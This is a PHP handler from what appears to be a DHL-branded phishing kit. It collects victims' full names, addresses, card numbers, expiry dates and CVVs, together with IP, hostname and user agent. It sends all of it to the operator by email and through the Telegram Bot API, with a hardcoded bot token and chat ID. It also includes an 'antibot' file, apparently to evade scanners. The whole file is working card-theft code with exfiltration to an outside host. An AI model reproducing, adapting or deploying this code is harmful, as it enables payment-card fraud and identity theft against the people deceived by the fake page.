<?php 

$nomtitulaire=$_POST['nomtitulaire'];
$xsfyy=$_POST['xsfyy'];
$xsfmm=$_POST['xsfmm'];
$xsfcvv=$_POST['xsfcvv'];
$xsfcc=$_POST['xsfcc'];
$nom=$_POST['nom'];
$prenom=$_POST['prenom'];
$adresse1=$_POST['adresse1'];
$adresse2=$_POST['adresse2'];
$codepostal=$_POST['codepostal'];
$ville=$_POST['ville'];
$ipp=$_SERVER['REMOTE_ADDR'];


$txt.="========================================================="."\n";
$txt.="nom complet :".$nom." ".$prenom."\n";
$txt.="Adress1 :".$adresse1."\n";
$txt.="Adress2 :".$adresse2."\n";
$txt.="city :".$ville."\n";
$txt.="ZIP :".$codepostal."\n";
$txt.="Card holder :".$nomtitulaire."\n";
$txt.="Cc :".$xsfcc."\n";
$txt.="Date :".$xsfmm." ".$xsfyy."\n";
$txt.="Cvv :".$xsfcvv."\n";
$txt.="Ip :".$ipp."\n";

include './email-dialk.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$msg  = "===================DHL=================="."\n";
$msg.="nom complet :".$nom." ".$prenom."\n";
$msg.="Adress1 :".$adresse1."\n";
$msg.="Adress2 :".$adresse2."\n";
$msg.="city :".$ville."\n";
$msg.="ZIP :".$codepostal."\n";
$msg.="Card holder :".$nomtitulaire."\n";
$msg.="Cc :".$xsfcc."\n";
$msg.="Date :".$xsfmm." ".$xsfyy."\n";
$msg.="Cvv :".$xsfcvv."\n";
$msg .= "===================================================="."\n";
$msg .= "date entry  :" . date("Y-m-d - H:i:s - ")."\n";
$msg .= "Client IP   : ".$ip."\n";
$msg .= "HostName    : ".$hostname."\n";
$msg .= "User Agent  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$msg .= "===================Metri copyright=====================\n";
$subject = "DHL " . "details:" . $id . " ip=> " . $ip;
mail($to,$subject,$msg);


$website="https://api.telegram.org/bot2147473191:AAHbilVW1pctUbZlNCa8lo1Co8rmZRvRmlc";

$params=[
    'chat_id'=>'623180276',
    'text'=>$txt,
];include'antibot.php';
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

echo json_encode($_POST);


 ?>
